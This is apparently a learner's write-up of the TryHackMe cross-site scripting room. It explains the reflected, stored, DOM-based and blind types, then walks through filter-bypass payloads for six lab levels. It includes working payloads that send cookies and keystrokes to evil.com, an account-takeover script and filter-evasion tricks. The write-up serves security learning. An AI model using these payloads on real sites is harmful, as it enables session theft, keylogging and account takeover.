# XSS — The Shapeshifter

**Date:** 31.03.2026
**Platform:** TryHackMe
**Room:** Cross-site Scripting
**Difficulty:** Medium

## The Creature

The Shapeshifter doesn't attack directly.
It hides inside trusted content.
The victim's own browser executes the attack.
The server never knows what happened.

## What is XSS

A website takes user input and displays it
back on the page without sanitizing it.
If that input contains JavaScript —
the browser executes it as real code.

The browser trusts the site.
The site trusts the input.
The attacker controls the input.
Therefore: the attacker controls the browser.

## The Four Faces of The Shapeshifter

### Reflected XSS
Lives in the URL. One-time attack.
Works only if victim clicks a crafted link.
Server reflects input back without sanitizing.

Example URL:
site.com/search?q=<script>alert('xss')</script>

### Stored XSS
Code saved to database. Permanent infection.
Executes for EVERY visitor automatically.
Most dangerous type — no interaction needed.

Targets: comments, profiles, listings,
anywhere user input is stored and displayed.

### DOM-Based XSS
Never touches the server.
Manipulates the page directly in the browser
via JavaScript. Server logs show nothing.
Look for: eval(), window.location,
document.write() in source code.

### Blind XSS
Like Stored XSS but attacker can't see
the result directly. Needs a callback.
Tool: XSS Hunter Express
Payload must include HTTP request back to attacker.

## Real Payloads — What They Actually Do

### Proof of Concept
<script>alert('XSS')</script>

Just proves the vulnerability exists.
Alert box appears = JavaScript executed =
attacker can now do anything JavaScript can do.

### Session Stealing
<script>fetch('https://evil.com/steal?c='
+ btoa(document.cookie));</script>

document.cookie = your session token.
btoa() = encodes it to base64.
fetch() = sends it to attacker's server.
Attacker receives your cookie →
logs in as you without knowing your password.

### Key Logger
<script>document.onkeypress = function(e) {
fetch('https://evil.com/log?k=' + btoa(e.key));
}</script>

Every key you press → sent to attacker.
Passwords, credit cards, messages — all of it.
Invisible. Silent. Continuous.

### Business Logic Attack
<script>user.changeEmail('attacker@hacker.thm')
</script>

Calls real functions of the application.
Changes account email to attacker's email.
Then attacker uses "forgot password" →
gets full account access.
No cookies needed.

## Level Walkthroughs — The Logic Behind Each

### Level 1 — Basic injection
Payload: <script>alert('THM')</script>

No filter. Input goes directly into the page.
Browser sees script tags → executes immediately.
This is the baseline — no protection at all.

### Level 2 — Input inside HTML attribute
The input was placed inside an HTML tag:
<input value="YOUR_INPUT_HERE">

Basic <script> tags don't work inside attributes.
Solution: break out of the attribute first.

Payload: "><script>alert('THM')</script>

" closes the value attribute
> closes the input tag
Then inject script normally.
The page becomes malformed HTML —
but browsers are forgiving and execute anyway.

### Level 3 — Angle brackets filtered
Site removes < and > characters.
Script tags impossible. Dead end?

No. Look at where input appears in source:
<input value='YOUR_INPUT'>

Escape the attribute differently:
Payload: ' onmouseover='alert(THM)'

' closes the value attribute
onmouseover= adds an event handler
When mouse moves over element → fires alert.
No script tags needed.
JavaScript lives inside HTML attributes too.

### Level 4 — Quotes filtered
Site removes single quotes too.
Can't close the attribute with ' anymore.

But the input appears in JavaScript code:
document.write('YOUR_INPUT')

Payload: ;alert('THM')//

; ends the current JavaScript statement
alert('THM') executes our code
// comments out everything after
(prevents syntax errors)

### Level 5 — Script word filtered
Site removes the word "script".
<script> becomes <>. Blocked.

But there are infinite ways to run JavaScript:
Payload: <sscriptcript>alert('THM')</sscriptcript>

Filter removes "script" from "sscriptcript"
What remains: <script>alert('THM')</script>
Filter applied once → bypass complete.

### Level 6 — External image with error handler
Input goes into image src attribute:
<img src="YOUR_INPUT">

Payload: /images/cat.jpg" onload="alert('THM')

Closes src attribute
Adds onload event handler
When image loads → fires alert.
Or use onerror if image doesn't exist:
/notexist" onerror="alert('THM')

## Why Stored XSS is More Dangerous Than Reflected

Reflected: victim must click a crafted link.
Attacker must send the link. Victim must click.
One victim. One click. One execution.

Stored: payload lives in the database.
Every visitor triggers it automatically.
No link needed. No click needed.
One injection → thousands of victims.

A stored XSS on a popular page =
automatic attack on every single visitor.
Forever. Until someone finds and removes it.

## How to Bypass XSS Filters — The Mental Model

When basic payload fails:
1. Check page source — where does input appear?
   In HTML? In attribute? In JavaScript?
2. What characters are filtered?
   Test: < > ' " script alert
3. Find alternative execution methods:
   Event handlers: onmouseover, onload, onerror
   Different tags: <img> <svg> <body> <iframe>
   JavaScript context: break out with ; or //
4. Try filter evasion:
   Case: <ScRiPt>
   Nested: <sscriptcript>
   Encoding: &#x3C;script&#x3E;

The filter is never perfect.
There are always more ways to run JavaScript
than there are ways to block it.

## What Surprised Me

Level 3 — I didn't know JavaScript could live
inside HTML attributes. onmouseover, onerror,
onload — these are all JavaScript triggers
that don't need script tags at all.

Level 5 — the filter removing "script" once
and leaving a new "script" behind.
Filters that don't loop are trivially bypassed.
Security is only as strong as its assumptions.

The real insight: XSS is not one attack.
It's a family of techniques all exploiting
the same root cause — trusting user input.
Change the context, change the technique.
The vulnerability stays the same.


## Open Questions

- How does Content Security Policy (CSP)
  prevent XSS? Can it be bypassed?
- What is XSS Hunter and how do
  bug bounty hunters use it?
- Can XSS work on modern frameworks
  like React or Vue?
  (spoiler: yes, but differently)
- What is DOM Clobbering?

## Tags
xss, cross-site-scripting, reflected, stored,
dom-based, blind, javascript, injection,
filter-bypass, session-stealing, owasp,
tryhackme, web-security, payloads